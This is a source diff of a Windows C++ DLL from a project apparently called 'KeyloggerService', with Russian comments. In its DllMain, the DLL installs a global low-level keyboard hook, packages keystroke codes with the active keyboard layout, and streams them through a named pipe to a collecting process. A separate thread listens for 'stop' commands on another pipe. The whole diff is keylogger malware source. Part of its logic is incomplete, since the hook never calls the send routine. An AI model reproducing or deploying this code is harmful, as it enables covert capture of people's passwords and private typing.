@@ -1,23 +1,20 @@
 #include <Windows.h>
-//#include <winternl.h>
-#include <TlHelp32.h>
-#include <iostream>
-#include <fstream>
-#include "defines.h"
 #include <vector>
+#include <thread>
+#include <defines.h>
+#include <fstream>
+#include <sstream>
+#include <iostream>
 #define TRAVERSE_FLAG_DEBUG   (1u << 1)
 #pragma comment (lib, "ntdll.lib")
 
-HHOOK g_hHook;
+// Глобальная переменная для механизма событий
+HANDLE hEvent;
+HANDLE hThread;
 HMODULE hLib;
-NTSTATUS status;
+HHOOK g_hHook;
+HANDLE writePipe;
 
-/* get_teb()
-Get the address of the thread environment block of a thread in another process.
-'tid' is the thread id of the thread
-'flags' is the optional flags parameter that was passed to traverse_threads() or a callback
-returns the TEB address on success
-*/
 void* get_teb(
     const DWORD tid,   // in
     const DWORD flags   // in, optional
@@ -129,52 +126,115 @@ DWORD dwCurrentProcessId;
 HANDLE hCurrentProcess;
 DWORD dwMainThreadId;
 
-void sendMyData(HWND receiver, const Rpc& data) {
-    // Создаем блок памяти и копируем туда данные
-    // Важно: данные должны быть скопированы в блок памяти, выделенный с помощью функции GlobalAlloc
-    // Если вы используете другой способ выделения памяти, передача данных может работать некорректно
-    void* buffer = GlobalAlloc(GMEM_FIXED, sizeof(Rpc));
-    if (buffer == 0)return;
-    memcpy(buffer, &data, sizeof(Rpc));
+bool stopFlag = false;
 
-    // Создаем структуру COPYDATASTRUCT
-    COPYDATASTRUCT* pcds = new COPYDATASTRUCT;
-    pcds->dwData = 0; // Некоторое пользовательское значение, которое может быть использовано приемником
-    pcds->cbData = sizeof(Rpc); // Размер блока памяти с данными
-    pcds->lpData = buffer; // Указатель на блок памяти
-
-    // Отправляем сообщение с помощью функции SendMessage или PostMessage
-    PostMessage(receiver, WM_MYMESSAGE, (WPARAM)(HWND)NULL, (LPARAM)&pcds);
-
-    //delete pcds;
+void Stop()
+{
+    stopFlag = true;
 }
 
+DWORD WINAPI readCommandThread(LPVOID lpParam)
+{
+    HANDLE readPipe = CreateFile(
+        L"\\\\.\\pipe\\myreadpipe",
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL);
 
+    if (readPipe == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
+        if (readPipe != NULL)CloseHandle(readPipe);
+        return 1;
+    }
+
+    while (!stopFlag) {
+        // Получение ответа от сервера
+        char buffer[256];
+        DWORD bytesRead = 0;
+        if (!ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
+            //std::cerr << "Failed to read data from named pipe: " << GetLastError() << std::endl;
+            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
+            if (outFile.is_open()) {
+                outFile << "Failed to read data from named pipe: " << GetLastError() << std::endl;
+                outFile.close();
+            }
+            CloseHandle(readPipe);
+            return 1;
+        }
+
+        // Обработка ответа от сервера
+        if (std::string(buffer).find("stop") != std::string::npos) {
+            Stop();
+        }
+
+        
+        //std::cout << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
+        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
+        if (outFile.is_open()) {
+            outFile << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
+            outFile.close();
+        }
+
+        // Проверка флага stopFlag
+        if (stopFlag) {
+            CloseHandle(readPipe);
+            return 0;
+        }
+
+        // Задержка для демонстрации работы в потоке
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+}
+
+void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
+    if (!writePipe)return;
+
+    KeyInfo info;
+    info.lang = keyLayout;
+    info.pnCode = nCode;
+    info.pwParam = wParam;
+    info.plParam = lParam;
+
+    // Размер структуры
+    std::size_t dataSize = sizeof(info);
+
+    DWORD bytesWritten = 0;
+    WriteFile(writePipe, &dataSize, sizeof(dataSize), &bytesWritten, NULL);
+    if (bytesWritten != sizeof(dataSize))
+    {
+        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
+        if (outFile.is_open()) {
+            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
+            outFile.close();
+        }
+    }
+
+    bytesWritten = 0;
+    WriteFile(writePipe, &info, sizeof(info), &bytesWritten, NULL);
+    if (bytesWritten != sizeof(info))
+    {
+        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
+        if (outFile.is_open()) {
+            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
+            outFile.close();
+        }
+    }
+}
 
 LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 
     if (nCode == HC_ACTION) {
+        HWND window = GetForegroundWindow();
+        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(window, NULL));
+        int keyLayout = reinterpret_cast<int>(keyboardLayout);
 
-        Rpc kw(Rpc::HookProc, nCode, wParam, lParam);
-        int hwnd_int = 0x0000000001aa003a;
-        HWND hWnd = reinterpret_cast<HWND>(hwnd_int);//FindWindow(NULL, KEYLOGGERWINDOW);
-        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\output.txt", std::ios_base::app);
-        if (outFile.is_open()) {
-            outFile << hWnd;
-        }
-        outFile.close();
-        //if (WorkerWindow) {
-            //sendMyData(hWnd,kw);
-            //PostMessage(hWnd, WM_MYMESSAGE, wParam, reinterpret_cast<LPARAM>(&kw));
-            //sendViaSharedMemory(kw);
-        PostMessage(hWnd, WM_MYMESSAGE, wParam, NULL);
-        //}
     }
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
 }
-
-
 
 BOOL InstallHook(DWORD dwThreadId)
 {
@@ -183,52 +243,87 @@ BOOL InstallHook(DWORD dwThreadId)
         outFile << "One" << std::endl;
     }
 
-    //HWND hWnd = FindWindow(NULL, _T("Window Title"));
-    //DWORD dwRemoteThreadId = GetWindowThreadProcessId(WorkerWindow, NULL);
     DWORD dwThisThreadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
 
     AttachThreadInput(dwThreadId, dwThisThreadId, TRUE);
 
-    // Теперь можно отправлять сообщения в найденное окно
-
-    //AttachThreadInput(dwThreadId, dwThisThreadId, FALSE);
-
     if (outFile.is_open())outFile.close();
 
     hLib = LoadLibrary(TEXT("HookDll"));
+
+    if (hLib == NULL) {
+        return FALSE;
+    }
+
     g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hLib, 0);
+
     if (g_hHook != NULL)
     {
-        MSG msg;
-        while (GetMessage(&msg, NULL, 0, 0))
-        {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
-
         return TRUE;
     }
     return FALSE;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
 {
-    switch (fdwReason)
+
+    switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        // получить идентификатор текущего процесса
+        // Создаем событие
+        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+         // получить идентификатор текущего процесса
         dwCurrentProcessId = GetCurrentProcessId();
-        // получить дескриптор текущего процесса
-        hCurrentProcess = GetCurrentProcess();
-        // выполнить InjectDLL в текущий процесс
-        //InjectDLL(lpDLLPath, dwCurrentProcessId, hCurrentProcess);
         dwMainThreadId = (DWORD)get_teb(dwCurrentProcessId, NULL);
+
+        writePipe = CreateFile(
+            L"\\\\.\\pipe\\mywritepipe",
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL);
+
+        if (writePipe == INVALID_HANDLE_VALUE) {
+            //std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
+            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
+            if (outFile.is_open()) {
+                outFile << "Failed to open named pipe: " << GetLastError() << std::endl;
+                outFile.close();
+            }
+            break;
+        }
+
         // установить хук в главном потоке текущего процесса
-        InstallHook(dwMainThreadId);
+        if (InstallHook(dwMainThreadId)) {
+            // Создаем поток, который будет выполнять бесконечную функцию
+            hThread = CreateThread(NULL, 0, readCommandThread, NULL, 0, NULL);
+
+            // Проверяем успешность создания потока
+            if (hThread == NULL)
+            {
+                UnhookWindowsHookEx(g_hHook);
+                // Обработка ошибки
+                return FALSE;
+            }
+        }   
         break;
     case DLL_PROCESS_DETACH:
-        // удалить хук
-        UnhookWindowsHookEx(g_hHook);
+        // Сигнализируем потоку, что нужно завершить работу
+        SetEvent(hEvent);
+
+        // Ждем завершения потока
+        WaitForSingleObject(hThread, INFINITE);
+
+        // Закрываем дескриптор события и потока
+        if (hEvent != NULL)CloseHandle(hEvent);
+        if(hThread != NULL)CloseHandle(hThread);
+        if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
+            CloseHandle(writePipe);
+        }
+
+        FreeLibrary(hModule);
         break;
     }
     return TRUE;
